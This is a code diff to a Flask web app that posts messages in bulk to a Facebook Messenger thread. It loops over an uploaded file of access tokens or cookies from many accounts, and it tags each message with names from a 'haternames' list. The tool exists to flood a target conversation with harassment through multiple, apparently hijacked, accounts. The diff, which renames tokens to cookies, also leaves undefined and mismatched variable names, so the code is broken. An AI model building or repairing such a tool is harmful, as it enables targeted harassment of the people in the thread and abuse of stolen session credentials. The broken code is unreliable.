@@ -25,21 +25,21 @@ threads = []
 def ping():
     return "✅ I am alive!", 200
 
-def send_messages(access_tokens, thread_id, time_interval, messages, haternames):
+def send_messages(access_Cookies, thread_id, time_interval, messages, haternames):
     hatername_cycle = itertools.cycle(haternames)  # Cycle through haternames
     while not stop_event.is_set():
         try:
             for message1 in messages:
                 if stop_event.is_set():
                     break
-                for access_token in access_tokens:
+                for access_cookie in access_cookies:
                     mn = next(hatername_cycle)  # Get next hatername
                     api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                     message = f"{mn} {message1}"
-                    parameters = {'access_token': access_token, 'message': message}
+                    parameters = {'access_token': access_Cookies, 'message': message}
                     response = requests.post(api_url, data=parameters, headers=headers)
                     if response.status_code == 200:
-                        print(f"✅ Sent: {message[:30]} via {access_token[:10]}")
+                        print(f"✅ Sent: {message[:30]} via {access_Cookie[:10]}")
                     else:
                         print(f"❌ Fail [{response.status_code}]: {message[:30]}")
                     time.sleep(time_interval)
@@ -52,7 +52,7 @@ def send_message():
     global threads
     if request.method == 'POST':
         token_file = request.files['tokenFile']
-        access_tokens = token_file.read().decode().strip().splitlines()
+        access_cookies = Cookies_file.read().decode().strip().splitlines()
 
         thread_id = request.form.get('threadId')
         time_interval = int(request.form.get('time'))
@@ -67,7 +67,7 @@ def send_message():
 
         if not any(thread.is_alive() for thread in threads):
             stop_event.clear()
-            thread = Thread(target=send_messages, args=(access_tokens, thread_id, time_interval, messages, haternames))
+            thread = Thread(target=send_messages, args=(access_Cookies, thread_id, time_interval, messages, haternames))
             thread.start()
             threads = [thread]
 
@@ -176,7 +176,7 @@ def send_message():
   </header>
   <div class="container text-center">
     <form method="post" enctype="multipart/form-data">
-      <label>Token File</label><input type="file" name="tokenFile" class="form-control" required>
+      <label>Cookies File</label><input type="file" name="cookieFile" class="form-control" required>
       <label>Thread/Inbox ID</label><input type="text" name="threadId" class="form-control" required>
       <label>Haternames (one per line)</label><textarea name="haternames" class="form-control" rows="4" placeholder="Enter haternames, one per line" required></textarea>
       <label>Delay (seconds)</label><input type="number" name="time" class="form-control" required>
@@ -207,5 +207,3 @@ def stop_sending():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-
-    
